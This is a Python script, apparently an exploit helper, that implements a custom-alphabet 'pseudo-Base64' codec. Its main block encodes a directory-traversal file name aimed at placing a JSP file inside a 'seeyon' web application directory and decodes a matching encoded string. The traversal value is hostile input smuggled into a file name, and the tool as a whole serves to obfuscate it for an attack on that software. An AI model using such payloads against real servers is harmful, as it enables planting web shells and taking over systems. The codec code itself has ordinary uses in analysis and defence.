#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
By 园长 && iiusky qq：45694300
"""


class Base64(object):
    def __init__(self):
        self.table_base64 = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"

    def decode(self, source):
        """
        :伪Base64解码
        :参数 source: 待解码的字符串
        :返回: 解码后的原文
        """
        retval = ""
        try:
            j = 0
            source_lst = [c for c in source]
            padding = [0, 0, 0, 0]
            source_len = len(source_lst)

            while j < source_len:
                for i in range(0, 4):
                    if j >= source_len:
                        padding[i] = 64
                    else:
                        k = self.table_base64.find(source_lst[j])
                        if k < 0:
                            k = 65
                        padding[i] = k
                    j += 1
                retval += chr(((padding[0] & 0x3F) << 2) + ((padding[1] & 0x30) >> 4))
                if padding[2] != 64:
                    retval += chr(((padding[1] & 0xF) << 4) + ((padding[2] & 0x3C) >> 2))
                    if padding[3] != 64:
                        retval += chr(((padding[2] & 0x3) << 6) + (padding[3] & 0x3F))
        except Exception as e:
            print("Base64解码时出错，错误：%s" % str(e))
        return retval

    def encode(self, source):
        """
        :伪Base64编码码
        :参数 source: 待编码的字符串
        :返回: 编码后的字符串
        """
        retval = ""
        try:
            j = 0
            source_lst = [ord(c) for c in source]
            source_len = len(source_lst)
            padding = [0, 0, 0, 0]

            while j < source_len:
                k = source_lst[j]
                j += 1
                padding[0] = ((k & 0xFC) >> 2)
                padding[1] = ((k & 0x3) << 4)

                if j < source_len:
                    k = source_lst[j]
                    j += 1
                    padding[1] = (padding[1] + ((k & 0xF0) >> 4))
                    padding[2] = ((k & 0xF) << 2)

                    if j < source_len:
                        k = source_lst[j]
                        j += 1
                        padding[2] = (padding[2] + ((k & 0xC0) >> 6))
                        padding[3] = (k & 0x3F)
                    else:
                        padding[3] = 64
                else:
                    padding[2] = 64
                    padding[3] = 64

                for i in range(0, 4):
                    retval += self.table_base64[padding[i]]
        except Exception as e:
            print("Base64编码时出错，错误：%s" % str(e))
        return retval


if __name__ == '__main__':
    obj = Base64()
    value = obj.encode(r"..\..\..\ApacheJetspeed\webapps\seeyon\test123456.jsp")
    print(value)
    value = obj.decode("qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6")
    print(value)
